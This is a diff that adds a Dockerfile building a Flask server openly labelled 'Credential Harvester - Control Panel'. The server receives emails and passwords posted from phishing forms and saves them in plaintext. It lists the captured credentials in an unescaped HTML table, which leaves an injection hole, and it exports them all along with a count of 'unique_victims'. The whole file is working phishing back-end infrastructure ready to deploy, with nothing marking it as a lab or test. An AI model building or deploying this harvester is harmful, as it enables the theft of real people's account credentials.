@@ -1,0 +1,70 @@
+FROM python:3.11-slim
+
+RUN pip install flask
+
+RUN mkdir -p /app
+
+RUN cat > /app/harvester.py << 'PY'
+from flask import Flask, request, jsonify
+import json, os
+
+app = Flask(__name__)
+CREDENTIALS_FILE = '/app/credentials.json'
+
+def load_credentials():
+    if os.path.exists(CREDENTIALS_FILE):
+        with open(CREDENTIALS_FILE) as f:
+            return json.load(f)
+    return []
+
+def save_creds(creds):
+    with open(CREDENTIALS_FILE, 'w') as f:
+        json.dump(creds, f, indent=2)
+
+@app.route('/harvest', methods=['POST'])
+def harvest():
+    creds = load_credentials()
+    entry = {
+        'email': request.form.get('email', ''),
+        'password': request.form.get('password', ''),
+        'timestamp': request.form.get('timestamp', ''),
+        'ip': request.form.get('ip', request.remote_addr),
+        'user_agent': request.form.get('user_agent', request.headers.get('User-Agent', ''))
+    }
+    creds.append(entry)
+    save_creds(creds)
+    return jsonify({'status': 'ok'})
+
+@app.route('/credentials')
+def show_creds():
+    creds = load_credentials()
+    if not creds:
+        return '<h1>No credentials captured yet</h1>'
+    html = '<h1>🎯 Captured Credentials</h1><table border="1" cellpadding="8"><tr><th>Email</th><th>Password</th><th>Time</th><th>IP</th></tr>'
+    for c in creds:
+        html += f'<tr><td>{c["email"]}</td><td>{c["password"]}</td><td>{c["timestamp"]}</td><td>{c["ip"]}</td></tr>'
+    html += '</table>'
+    return html
+
+@app.route('/metrics')
+def metrics():
+    creds = load_credentials()
+    total = len(creds)
+    unique_emails = len(set(c['email'] for c in creds))
+    return jsonify({
+        'total_captured': total,
+        'unique_victims': unique_emails,
+        'credentials': creds
+    })
+
+@app.route('/')
+def index():
+    return '<h1>Credential Harvester - Control Panel</h1><p><a href="/credentials">View Credentials</a></p><p><a href="/metrics">Metrics</a></p>'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+PY
+
+EXPOSE 8080
+
+CMD ["python", "/app/harvester.py"]
